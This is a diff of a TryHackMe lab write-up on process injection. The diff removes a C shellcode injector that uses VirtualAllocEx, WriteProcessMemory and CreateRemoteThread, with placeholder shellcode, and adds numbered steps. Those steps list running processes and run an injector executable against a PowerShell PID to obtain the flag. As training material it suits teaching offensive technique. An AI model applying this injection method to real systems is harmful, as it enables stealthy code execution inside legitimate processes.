@@ -4,114 +4,103 @@
 
 ## Abusing Processes
 
-![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Processes%20pt1.png)
-
-![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Processes%20pt2.png)
-
-![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Processes%20pt3.png)
+1. Started up this task's machine
+2. We'll then open up PowerShell on the provided Windows machine
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Processes%20pt4.png)
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Processes%20pt5.png)
 
-
-```C
-#include <windows.h>
-#include <stdio.h>
-
-unsigned char shellcode[] = "3484";
-
-int main(int argc, char *argv[]) {
-    HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (atoi(argv[1])));
-    PVOID b_shellcode = VirtualAllocEx(h_process, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-    WriteProcessMemory(h_process, b_shellcode, shellcode, sizeof shellcode, NULL);
-    HANDLE h_thread = CreateRemoteThread(h_process, NULL, 0, (LPTHREAD_START_ROUTINE)b_shellcode, NULL, 0, NULL);
-}
-```
+3. `Get-Process` from the Windows machine to display all of the processes that are currently running on this machine
 ```PowerShell
 PS C:\Users\THM-Attacker> Get-Process
 
 Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 -------  ------    -----      -----     ------     --  -- -----------
-    138       9    14984      14532              2784   0 amazon-ssm-agent
-    238      15     5240      18740       0.08   5024   2 ApplicationFrameHost
-     83       5      848       3784              3268   0 CompatTelRunner
-    151       9     6612      12504              2680   0 conhost
-    151       9     6600      12508              3548   0 conhost
-    255      13     4648      17904       0.30   3864   2 conhost
-    353      13     2168       5168               564   0 csrss
-    161       9     1664       4756               632   1 csrss
-    318      13     2208       5388               840   2 csrss
-    371      15     3624      15364       0.41   3360   2 ctfmon
-    233      16     3440      13232       0.17   4888   2 dllhost
-    541      22    16308      38644               504   1 dwm
-    618      31    16236      43736               556   2 dwm
-   1762      71    31772      97144       3.50   4908   2 explorer
-     49       7     2008       5968               492   2 fontdrvhost
-     49       6     1424       3732               900   0 fontdrvhost
-     49       6     1636       4272               908   1 fontdrvhost
-    196      11     1748        100              4060   0 GoogleCrashHandler
-    173       9     1832          8              3236   0 GoogleCrashHandler64
-    236      14     2352        168              3280   0 GoogleUpdate
+    139       9    14324      13832              2952   0 amazon-ssm-agent
+     80       5      852        304              2144   0 CompatTelRunner
+    151       9     6596       1340              2240   0 conhost
+    151       9     6600      12468              2516   0 conhost
+    155       9     6636      12500              4488   0 conhost
+    272      14     5668      19112       1.66   4540   2 conhost
+    348      13     2148       5132               560   0 csrss
+    161       9     1640       4732               632   1 csrss
+    280      12     2024       5156              2428   2 csrss
+    367      15     3564      15108       0.22   3388   2 ctfmon
+    233      23     5008      14192       0.13   4744   2 dllhost
+    604      28    16276      46644               108   2 dwm
+    541      22    16160      38436               504   1 dwm
+   1698      71    33568     101380       5.48   3504   2 explorer
+     49       6     1428       3744               896   0 fontdrvhost
+     49       6     1632       4276               904   1 fontdrvhost
+     49       8     3784       8812              1448   2 fontdrvhost
+    196      11     1744       1444              4024   0 GoogleCrashHandler
+    173       9     1856        972              3740   0 GoogleCrashHandler64
+    317      17     2900       4444              3068   0 GoogleUpdate
+    236      14     2416       1756              3292   0 GoogleUpdate
       0       0       56          8                 0   0 Idle
-     91       7     1176       5080              2060   0 LiteAgent
-    459      25    10972      43388              2400   1 LogonUI
-   1049      22     5128      15180               776   0 lsass
-    222      13     2904      10140              3036   0 msdtc
-    531      70   179612     106668               804   0 MsMpEng
-    260      14     2776      17912       0.14   3536   2 notepad
-    661      29    63960      74736       1.66   4036   2 powershell
-    319      13     2536      11488       0.23   2640   2 rdpclip
-      0      13      440      11708                68   0 Registry
-    474      23     9192      30256       1.95   2268   2 RuntimeBroker
-    207      11     2164      11620       0.06   3844   2 RuntimeBroker
-    265      14     3448      18584       0.09   3928   2 RuntimeBroker
-   1146      74    82960     152664       1.88   4440   2 SearchUI
-    312      11     3388       7676               764   0 services
-    714      29    15092      52348       0.36   3632   2 ShellExperienceHost
-    468      17     5060      25172       1.03   3088   2 sihost
-    315      20     7752      22936       0.22   4232   2 smartscreen
-     56       3      532       1240               412   0 smss
-    481      23     5864      16608              2040   0 spoolsv
-    157      10    15008      17244              2128   0 ssm-agent-worker
-   1830     100    42328      75228               628   0 svchost
-    848      27    26792      39508               844   0 svchost
-    870      23     7352      24488               880   0 svchost
-    747      17     5124      11460               972   0 svchost
-    719      34    13168      24696               988   0 svchost
-    631      20    17212      28644              1152   0 svchost
-    623      31     8832      25108              1196   0 svchost
-    693      38     8160      22560              1260   0 svchost
-    313      11     2072       8964              1268   0 svchost
-    371      16    11724      12768              1276   0 svchost
-    201      10     4160      13216              1444   0 svchost
-    398      32     8864      17756              1460   0 svchost
-    200      11     1564       7176              1624   0 svchost
-    223      10     1920       7464              1720   0 svchost
-    203      10     2064       8196              2160   0 svchost
-    462      20     6628      29948       0.44   3176   2 svchost
-    145       8     1500       7272              3348   0 svchost
-    185      11     3912      11768              4792   0 svchost
-    386      16     5488      15508              2140   0 Sysmon
-   2008       0      192        156                 4   0 System
-    313      13     4300      17728       0.11   2800   2 taskhostw
-    243      24     4932      14616       0.19   3200   2 taskhostw
-    126       7     1288       6620              3068   0 unsecapp
-    179      11     1572       6896               652   0 wininit
-    250      12     2616      15364               724   1 winlogon
-    290      12     2660       9896              1336   2 winlogon
-    194      12     3080       9432              2412   0 WmiPrvSE
+     91       7     1160       5060              2072   0 LiteAgent
+    461      25    10988      43312              2432   1 LogonUI
+   1000      22     4928      14684               772   0 lsass
+    152       8     2200       7476              4936   0 MpCmdRun
+    208      10     2472       9080              5064   0 MpCmdRun
+    222      13     2988      10176              4476   0 msdtc
+    534      70   173772      98216              1468   0 MsMpEng
+    654      50   138580     148660       6.81   1760   2 powershell
+    309      13     2460      11216       0.06   3084   2 rdpclip
+      0      13     2048      11500                68   0 Registry
+    223      11     2264      12092       0.13   2860   2 RuntimeBroker
+    456      22     9104      29472       1.73   3500   2 RuntimeBroker
+    241      13     3388      18228       0.13   3980   2 RuntimeBroker
+   1127      73    83852     156512       4.45   3988   2 SearchUI
+    308      11     3340       7684               760   0 services
+    749      30    15540      52256       0.36   3872   2 ShellExperienceHost
+    451      17     4792      24620       0.58   3104   2 sihost
+    324      20     7680      22404       0.05   4640   2 smartscreen
+     56       3      508       1224               408   0 smss
+    473      22     5680      16552              2020   0 spoolsv
+    155      10    14856      17108              2532   0 ssm-agent-worker
+    799      26    26376      39680               620   0 svchost
+   1941     106    43104      77388               636   0 svchost
+    590      30    11124      21952               752   0 svchost
+    831      23     6616      23580               876   0 svchost
+    735      16     4520      10896               968   0 svchost
+    180      10     3900      12984               976   0 svchost
+    627      20    15704      27292              1164   0 svchost
+    570      29     8096      20948              1204   0 svchost
+    311      11     1964       8812              1272   0 svchost
+    692      38     8160      22568              1284   0 svchost
+    361      16    10384      11376              1400   0 svchost
+    413      32     8884      17784              1420   0 svchost
+    206      10     1648       7268              1752   0 svchost
+    200      11     1584       7124              1792   0 svchost
+    201      10     2052       8140              2160   0 svchost
+    455      20     6200      30364       0.33   3212   2 svchost
+    183      11     4860      11116              3804   0 svchost
+    388      16     5436      15476              2132   0 Sysmon
+   1917       0      192        156                 4   0 System
+    235      20     3956      12832       0.08   3236   2 taskhostw
+    120       7     1252       6612              2212   0 unsecapp
+    172      11     1348       6848               680   0 wininit
+    250      12     2628      15332               696   1 winlogon
+    276      12     2504       9808              2632   2 winlogon
+    173       9     2224       8432              4196   0 WmiPrvSE
 ```
 
+4. `cd <EXPLOIT DIRECTORY>` from the Windows machine to change into the directory containing our shellcode injection
 ```PowerShell
 PS C:\Users\THM-Attacker> cd .\Desktop\Injectors\
 ```
+
+5. `<EXPLOIT> <PID>` from the Windows machine while providing a PID of a process that's running under the current user we're running as, for which we chose 1760 as the PID since that's the PID for PowerShell, which we are currently running, and by doing so we've successfully managed to inject shellcode into the target process, which ended up giving us the flag for this task
 ```PowerShell
-PS C:\Users\THM-Attacker\Desktop\Injectors> .\shellcode-injector.exe 4968
+PS C:\Users\THM-Attacker\Desktop\Injectors> .\shellcode-injector.exe 1760
 ```
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Processes%20pt6.png)
 
+
+**TASK COMPLETED!**
 
 ## Expanding Process Abuse
 
